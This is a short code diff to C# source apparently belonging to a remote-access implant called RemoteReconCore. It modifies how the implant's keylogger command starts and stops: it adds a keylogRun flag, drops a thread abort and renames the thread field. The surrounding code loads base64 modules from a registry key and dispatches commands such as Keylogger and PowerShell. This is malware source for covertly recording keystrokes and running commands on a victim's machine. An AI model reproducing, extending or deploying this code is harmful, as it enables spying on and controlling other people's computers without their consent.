@@ -141,6 +141,9 @@ namespace RemoteReconCore
                         break;
                 }
             }
+
+            if (thr.IsAlive)
+                thr.Abort();
         }
 
         private void HandleCommand()
@@ -167,6 +170,7 @@ namespace RemoteReconCore
             {
                 mod = Convert.FromBase64String((string)rrbase.GetValue(modkey));
                 Keylogger logger = new Keylogger(Convert.ToInt32(command.Value));
+                keylogRun = true;
                 result = logger.Run();
             }
             else if ((int)Cmd.PowerShell == command.Key)
@@ -215,7 +219,7 @@ namespace RemoteReconCore
 #endif
                 try
                 {
-                    t.Abort();
+                    keylogRun = false;
                     string msg = Convert.ToBase64String(Encoding.ASCII.GetBytes("Keylogging stopped"));
                     result = new KeyValuePair<int, string>(0, msg);
                 }
@@ -241,10 +245,11 @@ namespace RemoteReconCore
         public static byte[] mod;
         public static string modkey;
         public static string kkey;
+        public static bool keylogRun;
         private static KeyValuePair<int, object> command;
         private static KeyValuePair<int, string> result;
         public static RegistryKey rrbase;
-        public static Thread t;
+        public static Thread thr;
 
         //Result enum for commnands
         public enum Result : int
